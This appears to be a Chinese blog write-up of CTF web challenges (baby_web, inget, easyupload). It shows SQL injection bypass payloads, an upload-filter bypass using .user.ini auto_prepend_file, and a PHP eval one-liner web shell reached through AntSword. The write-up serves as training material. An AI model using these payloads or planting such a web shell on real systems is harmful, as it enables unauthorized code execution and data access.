---
abbrlink: ''
categories:
- - web
date: '2025-03-28T22:10:29.916804+08:00'
tags:
- web
- ctf
title: web（1）
updated: '2025-03-28T22:10:30.289+08:00'
---
# 概述

涉及的题目有：攻防世界baby web、inget、easyupload、

fileinclude、fileclude、easy php、file_include

# 涉及

index.php 、超基本sql注入、user.ini及一句话木马、php审计、php://filter协议读取文件的运用、弱比较、php://filter协议下不同编码运用

# baby_web

![](https://s2.loli.net/2025/03/28/GXV3RPyqdNhjJou.png)

题目表述是“想想初始页面是哪个”，我们很容易联想到index.php, 那么输入index.php,发现又被重新定向到了1.php,那么我们按f12查看“网络”，就可以找到未被定向到的index.php,在flag一栏中就可以找到flag啦

![](https://s2.loli.net/2025/03/28/tmgb8FXf4ODqZUW.png)

# inget

打开容器后显示：please enter id,and Try to bypass

那先尝试通过get方法传入id的值，猜测id为admin

![](https://s2.loli.net/2025/03/28/sNHiDIwh4aQ1UBt.png)

典中典，勾引一波) 我们啥也不知道，也没有hint，只能get，那么自然联想到sql注入

## 什么是sql注入?

原理如下：

假设后端查询语句为：

`SELECT * FROM users WHERE id = '$id';`

其中 `$id` 是用户输入的参数。

当用户输入 `' or '1'='1` 时，参数替换后查询变为：

`SELECT * FROM users WHERE id = '' or '1'='1';`

注意到`' or '1'='1`中第一个'和最后一个'是为了闭合后端原本存在的'号

所以这题payload就有了：`/?id=' or '1'='1`

也可以`/?id=' or 1=1 -- +`其中--+起到注释后文的作用


# easyupload

![](https://s2.loli.net/2025/03/28/SlRhxagqOyCBFP1.png)

打开这个样，他要我们传照片

上传类型题目，还要是图片，我们可以运用user.ini

.user.ini：用户配置文件 auto\_prepndend\_file——指定在每个PHP页面执行前所要执行的代码

那么我们可以以.user.ini为桥梁，让服务器跑一句话木马

user.ini怎么写呢

```
GIF89a
auto_prepend_file=a.jpg   
```

接着，文件a写为：

```
GIF89a
<?php @eval($_POST[cmd]);?>
```

这个就是一个一句话木马，先在txt中写好，加上gif89a图片文件头，再改后缀为jpg

下面就可以进行上传了，因为要传一个不属于图片的.user.ini，所以我们要在bp抓包后，修改文件类型再上传

![](https://s2.loli.net/2025/03/28/S2nyAE8VHzCkaUG.png)

文件类型修改为 image/jpg,再改一下文件名，//win中文件命名不能以 . 开头

然后a就随便传，最后打开蚁剑进行连接

![](https://s2.loli.net/2025/03/28/2PNxWHXQLVs9DuG.png)

连上就能再目录找到flag了
